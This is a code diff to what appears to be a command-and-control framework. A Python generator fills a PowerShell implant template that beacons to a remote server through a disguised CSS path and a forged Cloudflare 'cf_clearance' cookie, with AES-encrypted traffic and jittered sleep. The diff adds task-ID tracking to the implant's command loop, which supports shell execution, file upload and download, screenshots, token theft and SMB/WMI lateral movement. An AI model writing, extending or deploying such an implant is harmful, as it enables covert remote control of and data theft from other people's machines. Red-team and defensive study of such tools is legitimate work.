@@ -34,6 +34,7 @@ Write-AgentDebug "Agent starting..."
 $global:agentUri = "{{AGENT_URI}}"
 $global:agentProt = "{{AGENT_PROTOCOL}}"
 $global:agentHost = "{{AGENT_HOST}}"
+if (-not $global:agentUrl) { $global:agentUrl = "{{AGENT_URL}}" }
 $global:aesKey = "{{AES_KEY}}"
 $global:sleepTime = {{SLEEP_TIME}}
 $global:jitter = {{JITTER}}
@@ -292,6 +293,7 @@ function CreateCookie {
 }
 
 $global:lastCommand = ""
+$global:lastTid = 0
 $global:knownCommands = @("execute", "pkill", "plist", "pname", "upload", "download", "list", "shell", "screenshot", "delete", "fcopy", "mkdir", "exit", "who", "asleep", "make_token", "rev2self", "smb_exec", "wmi_exec")
 
 function Get-JitteredSleepTime {
@@ -334,8 +336,8 @@ function SendOutput {
         $fullUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)"
         $uri = [System.Uri]$fullUri
         $uploadUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)/upload"
-        
-        $jsonData = "{""uuid"":""$($global:uniqueId.Substring(0, 16))""}"
+
+        $jsonData = "{""uuid"":""$($global:uniqueId.Substring(0, 16))"",""tid"":$($global:lastTid)}"
         $encrypted = aes $jsonData "encrypt"
         $clearanceCookie = New-Object System.Net.Cookie("cf_clearance", $encrypted)
         $clearanceCookie.Domain = $uri.Host
@@ -384,6 +386,7 @@ function SendOutput {
             uuid = $global:uniqueId.Substring(0, 16)
             data = $output
             type = "command_output"
+            tid = $global:lastTid
         }
         
         $jsonData = ConvertTo-Json $outputData -Compress
@@ -488,8 +491,9 @@ function execCommandLoop {
 
             $uuid = $jsonObject.uuid
             $cmd = $jsonObject.cmd
+            $tid = if ($jsonObject.PSObject.Properties['tid']) { $jsonObject.tid } else { 0 }
 
-            Write-AgentDebug "Decrypted command - UUID: '$uuid' | CMD: '$cmd'"
+            Write-AgentDebug "Decrypted command - UUID: '$uuid' | CMD: '$cmd' | TID: '$tid'"
 
             if ($uuid -ne $global:uniqueId.Substring(0,16)) {
                 Write-AgentDebug "UUID mismatch - Expected: '$($global:uniqueId.Substring(0,16))' | Received: '$uuid'"
@@ -501,8 +505,9 @@ function execCommandLoop {
 
             $newCommand = $cmd.Trim()
 
-            if ($newCommand -and $newCommand -ne $global:lastCommand) {
-                Write-AgentDebug "New command received: '$newCommand'"
+            if ($newCommand -and $tid -ne $global:lastTid) {
+                Write-AgentDebug "New task received (TID: $tid): '$newCommand'"
+                $global:lastTid = $tid
                 $global:lastCommand = $newCommand
 
                 $cmdParts = $newCommand -split " ", 2
@@ -569,7 +574,7 @@ function execCommandLoop {
                 if (-not $newCommand) {
                     Write-AgentDebug "No command in response"
                 } else {
-                    Write-AgentDebug "Duplicate command ignored: '$newCommand'"
+                    Write-AgentDebug "Duplicate task ignored (TID: $tid): '$newCommand'"
                 }
             }
         } catch {
@@ -1291,15 +1296,19 @@ execCommandLoop'''
             hosts = upstream_config.get('hosts', [])
             
             aes_key = self.config_loader.get_aes_key()
-            
+            port = bind_config.get('port', 443 if protocol == 'https' else 80)
+
             main_uri = uris[0] if uris else "/main.c76af346.css"
             main_host = hosts[0] if hosts else "localhost"
-            
+
+            default_port = 443 if protocol == 'https' else 80
+            agent_url = main_host if port == default_port else f"{main_host}:{port}"
+
             ps_headers = self._build_powershell_headers(request_headers, main_host, user_agent)
-            
+
             debug_mode = self.config_loader.get_agent_debug_mode()
             debug_value = "$true" if debug_mode else "$false"
-            
+
             configured_agent = self.agent_template.replace(
                 '{{DEBUG_MODE}}', debug_value
             ).replace(
@@ -1308,6 +1317,8 @@ execCommandLoop'''
                 '{{AGENT_PROTOCOL}}', protocol
             ).replace(
                 '{{AGENT_HOST}}', main_host
+            ).replace(
+                '{{AGENT_URL}}', agent_url
             ).replace(
                 '{{AES_KEY}}', aes_key
             ).replace(
